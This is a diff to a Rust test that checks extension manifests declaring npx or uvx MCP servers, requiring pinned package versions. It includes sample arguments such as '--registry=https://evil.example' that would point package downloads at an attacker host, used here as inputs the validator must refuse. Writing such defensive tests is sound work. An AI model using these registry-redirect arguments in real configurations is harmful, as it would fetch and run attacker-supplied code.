@@ -292,14 +292,40 @@ fn mcp_servers_may_not_set_the_loader_or_the_proxy() {
         ("uvx", "acme-db>=1.2", false),
         ("uvx", "git+https://github.com/acme/db@1.2.3", false),
     ] {
+        let args = if command == "npx" {
+            vec!["-y", package]
+        } else {
+            vec![package]
+        };
         let m = manifest(json!({ "contributes": {
-            "mcpServers": [{ "name": "db", "command": command, "args": ["-y", package] }]
+            "mcpServers": [{ "name": "db", "command": command, "args": args }]
         }, "main": null }));
         let all = [("kule-extension.json", m.as_bytes())];
         assert_eq!(
             Package::open(zip_of(&all)).is_ok(),
             ok,
             "{command} {package}"
+        );
+    }
+    // An option before the package could say where it comes from.
+    for (command, args) in [
+        ("npx", vec!["--registry=https://evil.example", "db@1.2.3"]),
+        (
+            "npx",
+            vec!["-y", "--registry", "https://evil.example", "db@1.2.3"],
+        ),
+        (
+            "uvx",
+            vec!["--index-url=https://evil.example", "acme-db==1.2.3"],
+        ),
+        ("uvx", vec!["-y", "acme-db==1.2.3"]),
+    ] {
+        let m = manifest(json!({ "contributes": {
+            "mcpServers": [{ "name": "db", "command": command, "args": args }]
+        }, "main": null }));
+        refused(
+            zip_of(&[("kule-extension.json", m.as_bytes())]),
+            "exact version",
         );
     }
 }
